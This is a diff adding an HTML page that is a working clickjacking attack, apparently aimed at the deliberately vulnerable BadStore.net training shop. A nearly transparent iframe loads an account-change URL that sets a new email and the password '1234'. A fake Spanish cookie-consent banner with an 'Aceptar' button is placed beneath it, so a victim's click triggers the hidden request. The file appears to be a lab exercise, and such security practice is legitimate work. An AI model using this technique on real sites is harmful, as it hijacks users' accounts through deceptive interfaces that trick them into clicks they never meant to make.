@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BadStore.net</title>
+    <style>
+        * {
+            margin:0;
+            padding:0;
+        }
+        html {
+            height:100%;
+        }
+        body {
+            height:100%;
+        }
+        iframe {
+            position:relative;
+            width:100%;
+            height:100%;
+            z-index:2;
+            opacity:0.000001;
+        }
+        #click {
+            position:absolute;
+            background:rgba(0,0,0,.5);
+            z-index:1;
+            width:100%;
+            height:100%;
+            background:url('image.png');
+        }
+        #blackbox {
+            position:absolute;
+            background:rgba(0,0,0,.5);
+            width:100%;
+            height:100%;
+        }
+        button {
+            position:absolute;
+            top:508px;
+            left:465px;
+            width:100px;
+            background:purple;
+            color:#FFFFFF;
+            font-weight:bold;
+            border-style:none;
+            height:20px;
+        }
+        p {
+            position:absolute;
+            top:430px;
+            left:465px;
+            width:400px;
+            font-family:Calibri;
+            color:#FFFFFF;
+        }
+        a {
+            position:absolute;
+            top:508px;
+            left:580px;
+            font-family:Calibri;
+            /* text-decoration:none; */
+            color:#FFFFFF;
+        }
+    </style>
+</head>
+<body>
+    <div id="click">
+        <div id="blackbox">
+    </div>
+        <p>Utilizamos cookies de terceros para generar estadísticas de audiencia y mostrar publicidad personalizada analizando tu navegación. Si sigues navegando estarás aceptando su uso.</p>
+        <button>Aceptar</button>
+        <a href="#">Más información</a>
+    </div>
+    <iframe src="http://www.badstore.net/cgi-bin/badstore.cgi?action=myaccount&fullname=Abraham+Raymundo&newemail=abc@gmail.com&newpasswd=1234&vnewpasswd=1234" frameborder="0"></iframe>
+</body>
+</html>
